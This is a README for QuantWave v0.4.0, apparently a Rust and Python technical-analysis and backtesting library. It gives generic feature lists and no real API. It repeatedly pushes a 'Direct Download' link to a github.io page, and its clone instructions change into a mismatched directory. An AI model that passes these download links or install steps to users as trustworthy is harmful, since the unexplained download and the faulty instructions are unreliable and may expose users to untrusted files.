# QuantWave v0.4.0 - Technical Analysis Library 2026

> **Polars-native technical analysis for Rust and Python, built around indicators, regime detection, backtesting, and options analytics in version 0.4.0.**

[![Platform](https://img.shields.io/badge/Platform-Rust%20and%20Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.4.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/chris-brooks57/quantwave-ta-library?style=flat-square)](https://github.com/chris-brooks57/quantwave-ta-library)

---

<p align="center">
  <a href="https://chris-brooks57.github.io/quantwave-ta-library/">
    <img src="https://img.shields.io/badge/Download-QuantWave%20Latest-brightgreen?style=for-the-badge" alt="Download QuantWave">
  </a>
</p>

> **[Direct Download - QuantWave v0.4.0](https://chris-brooks57.github.io/quantwave-ta-library/)**

---

[Download Latest Build](https://chris-brooks57.github.io/quantwave-ta-library/)

---

## Overview

QuantWave is a performance-oriented technical analysis library for quantitative finance workflows in Rust and Python. It brings indicator computation, regime-sensitive analysis, and backtesting tools into a Polars-native package, making it a natural fit for pipelines where expression integration and execution speed are important.

The library is well suited to developers creating trading research utilities, prototype strategies, or broader analytics stacks that need consistent behavior across batch and streaming paths. It also adds options analytics centered on India markets, extending beyond a typical indicator-only toolkit.

---

## What it includes

- 221 native technical indicators
- Polars-native, zero-copy expressions
- Full Ehlers DSP suite
- Matching behavior for streaming and batch workflows
- Regime detection tools for market state analysis
- Options India analytics support
- Built-in backtest engine
- Gold-standard validation workflows

---

## Installation

Clone the repository, then install the bindings or entry points that line up with your preferred workflow.

```bash
git clone https://github.com/chris-brooks57/quantwave-ta-library.git
cd quantwave
```

For an initial run, launch the project entry point or import it from your Rust or Python environment based on the integration route you selected.

---

## Usage

A typical workflow starts with market data, applies indicator expressions, and then layers on regime logic or backtesting.

Example workflow:

1. Prepare price or options data in Polars.
2. Apply QuantWave indicators or DSP functions.
3. Evaluate regime signals or strategy rules.
4. Run the backtest engine on the resulting series.
5. Review outputs for validation and research.

Rust and Python users can organize the same analysis around the same underlying data flow, which helps keep research code and deployed logic aligned.

---

## Configuration

QuantWave is usually configured inside your own codebase, environment, or pipeline setup instead of through a large standalone config file.

If your project relies on local settings, store them next to the strategy or analytics module and document the values you use, such as data source paths, instrument filters, or backtest parameters.

```toml
[quantwave]
mode = "batch"
market = "options-india"
validation = "gold-standard"
```

---

## Requirements

- Rust and/or Python environment
- Polars-compatible data workflow
- Sufficient memory for indicator-heavy or backtest workloads
- Market data inputs suitable for technical analysis and options analytics
- Repository setup that matches your chosen integration method

---

## FAQ

**How do I stay current?**  
Use the latest release or build link above, and follow repository updates for version-specific changes.

**Can it handle both batch and streaming analysis?**  
Yes. The library is designed so batch and streaming behavior stay aligned.

**Where should I adjust defaults?**  
Make the change in your own code path, config values, or pipeline settings.

**What if an indicator or strategy behaves unexpectedly?**  
Start by checking the input data, window settings, and validation flow, then compare the result with the available gold-standard checks.

**Who is it intended for?**  
QuantWave is aimed at quantitative developers, trading researchers, and analytics teams working in Rust, Python, and Polars-based environments.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
